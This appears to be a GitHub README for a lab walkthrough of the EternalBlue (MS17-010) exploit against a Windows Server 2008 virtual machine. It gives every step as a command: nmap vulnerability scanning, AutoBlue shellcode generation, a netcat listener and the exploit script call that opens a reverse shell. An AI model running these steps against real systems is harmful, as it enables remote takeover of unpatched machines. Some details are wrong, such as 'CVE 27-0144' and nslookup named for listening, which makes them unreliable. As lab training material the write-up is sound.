# MS17-010-Eternal-Blue-Semi--Manual-Exploitation


<h2>Description</h2>
In this lab we are going to learn the CVE 27-0144 (MS17-010) vulnerability. This vulnerability is a buffer overflow vulnerability in a specific function named as ‘Srv!Srv0s2FeaToNt’. This type of buffer overflow vulnerability occurs when a program writes more data in the memory buffer than its capability. It potentially allows an hacker to execute the code arbitrarily. 

The reason of this vulnerability:
The size for the buffer overflow was actually calculated in the function ‘Srv!Srv0s2FeaListSizeToNt’. But there happens to be a mathematical error in the calculation. The error was a DWORD (a 32-bit value) is subtracted into a WORD (a 16-bit value) which led to buffer overflow. With this vulnerability, the kernel pool is manipulated so that data is the overflowed data is positioned to overwrite a buffer related to Server Message Block (Version 1), which is a network protocol.

Such that, the vulnerability is present in windows SMB version 1 which is available in various versions of windows. This vulnerability allows hackers to execute codes as per their requirement on the target computer. We can use tools like Metasploit to exploit this eternal blue vulnerability.

<br />


<h2>Languages and Utilities Used</h2>

- <b>Bash Scripting</b> 


<h2>Environments Used </h2>

- <b>Kali Linux</b> (21H2)
- <b>Windows Server 2008 in virtual machine</b> (21H2)
- <b>AutoBlue, nmap, netcat</b>

<h2>Setup Walk Through</h2>

This lab is semi manual exploitation of the vulnerability via AutoBlue tool. We will be also using the nmap and nslookup tool for vulnerability discovery and port listening respectively.

<p align="left">
Step 1: Installation of AutoBlue Tool <br />

1. Clonning the tool <br />
Command: sudo apt update
Command: sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git


2. install requirements.txt <br />
After cloning the tool in our present directory, we need to install the requirements for the tool.
Command: pip install -r requirements.txt







<br />
<br />

Step 2: Get the IP address of the target machine <br />
Assuming that, we have already setup the windows server 2008 with SMB1 in our virtual machine. Now we need to get the IP address of the target machine. 

For that, we need to open the command prompt of windows server by clicking to start menu and then type cmd. In cmd, <br />
Command: ipconfig <br />
![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/2aea9773-25bd-46ab-8182-134f4507b387)
<br />

<br />
Here, we can see the IP address of the targeted machine is 10.0.0.178


<br />

<br />
<br />
Step3: Scanning for vulnerability<br /> 
In order to test, if the machine we are targeting, is vulnerable to the attack, we can use nmap tool.
For that, we need to see if the SMB (Server Message Block) port is open. The port number for SMB is 445. So lets scan port 445 using nmap. <br />

Command: sudo nmap -sV -p 445 -O 10.0.0.178 <br />
Here, <br />
-sV = this flag determines the service version of the targeted port. <br />
-p = this flag specifies the port number <br />
-O = this flag reveals the operating system in use. <br />

![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/61d92661-aa23-4ea7-b597-084a9b52bf32)


<br />
Here,

This is running windows server 2008 and SMB port is open.

Hence, we can move further with the scanning of the system for the vulnerability. For that, lets use the script provided in nmap. For that navigate to the nmap directory.
As we are particularly looking for the smb scripts, we can execute the following command. <br />

Command: ls -al /usr/share/nmap/scripts | grep smb- <br />

![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/775ab5af-febb-41a3-b782-61bb4de59239)




We can see there is a scanning way with nmap for the particular vulnerability we are looking for now. <br />

Command: sudo nmap -sV -p 445 -O –script=smb-vuln-ms17-010 10.0.0.178 <br />

So, now based on the result produced, the server is vulnerable <br />



![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/f51607a9-b468-4169-b6e7-9c5dd410ebcb)







































<br />

Step 4: Exploiting the Vulnerability <br />

To exploit the vulnerability, we already discussed that we are going to use the AutoBlue tool. So lets navigate to the directory of AutoBlue-MS17-010.

When we list the contents of the particular directory, we will be able to see the shellcode directory and inside the shellcode directory, there will be shell_prep.sh file. <br />


To run the script, we need to give executable permission to shell_prep.sh file <br />

Command: chmod +x shell_prep.sh <br />

![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/4a2c2358-1d78-4b24-822d-855e842f766f) <br />

Then run the script: <br />
![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/17bdb563-d624-4d35-97d3-de5e33c1aa4e) <br />


The script will be asking for the IP of the attacking machine (This machine is kali linux, from where we are going to execute the attack, and listening the reverse shell. For now its, 10.0.0.239. 
To see the IP address of our kali linux machine. We can go to terminal and type, <br />
Command: ip addr <br />
![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/16db3ae5-5754-4485-8977-da2aa5b7fba7) <br />


 We can now provide the IP address and the port we want to listen is 1234 for x64 and x86. <br />

Moreover, we can choose shell where we will be able to run the shell commands.
And we will choose stageless payload for now.
<br />

Then the cmd Shell will get generated. <br />
![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/7640e24b-f534-467d-8089-b74e158e9995)

<br />
After this, we can list the shellcode generated in the Shellcode directory <br />

Command: ls -alps <br />

![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/37bb6ac8-b921-4dd0-a766-43765bc4bb22) <br />




Here, we can see multiple files generated. For now we can use the sc_x64.bin for shell and as per our target machine. 



<br />
Setting up the listener: <br />

Before executing the exploiting script, we need to setup our listener.
We can use netcat in a new terminal to listen on the port number 1234. So, for that, 

Command: nc -nvlp 1234 <br />

![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/2ffde4b8-af3d-45e7-ad79-48db085c3f16) <br />



Running Exploitation <br />

We can now go back to the Auto-Blue tool main directory where are exploits are available.
![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/162683f5-5018-4085-9f33-cd1268964ebb) <br />


Here, we can see the highlighted one is the particular one for windows7 and windows server 2008.

So , we can use that, for that lets run that python file with the target IP address and the shellcode that we nee to run from the previous shellcode directory for our particular target. 
Command: python3 eternalblue_exploit7.py 10.0.0.178 shellcode/sc_x64.bin <br />

![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/882e8d9d-42cd-41bc-adf6-dc34d76bdcb0) <br />


And check in the listening section, there will be shell of the target system opened. <br />

![image](https://github.com/swopnilshakya7/MS17-010-Eternal-Blue-Semi--Manual-Exploitation/assets/140642619/0863cf11-2b87-4702-9318-ef50b70dbee7) <br />


Here, we have successfully opened the shell of the windows server 2008 in our kali linux attacker machine.
<br />

<br />

<h3>Disclaimer</h3>
The content is completely for education purpose only. Any or full replication done to harm or unethical use may subjected to legal offense.
